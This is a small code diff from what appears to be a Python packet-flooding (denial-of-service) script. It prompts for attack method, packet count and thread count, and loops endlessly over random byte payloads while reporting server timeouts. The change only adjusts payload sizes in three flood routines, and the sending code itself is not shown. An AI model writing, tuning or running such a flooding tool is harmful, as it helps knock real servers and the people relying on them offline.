@@ -80,7 +80,7 @@ choice = str(input(" \033[94mMethods: "))
 times = int(input(" \033[0;31mPacket:"))
 threads = int(input(" \033[0;32mThreads:"))
 def run():
-	data = random._urandom(487)
+	data = random._urandom(577)
 	i = random.choice(("[+]","[-]"))
 	while True:
 		try:
@@ -93,7 +93,7 @@ def run():
 			print("[!] ERROR SERVER TIME OUT")
 			
 def run2():
-	data = random._urandom(818)
+	data = random._urandom(16)
 	i = random.choice(("[+]","[-]"))
 	while True:
 		try:
@@ -106,7 +106,7 @@ def run2():
 			print("[!] ERROR SERVER TIME OUT")
 			
 def run3():
-	data = random._urandom(818)
+	data = random._urandom(1020)
 	i = random.choice(("[+]","[-]"))
 	while True:
 		try:
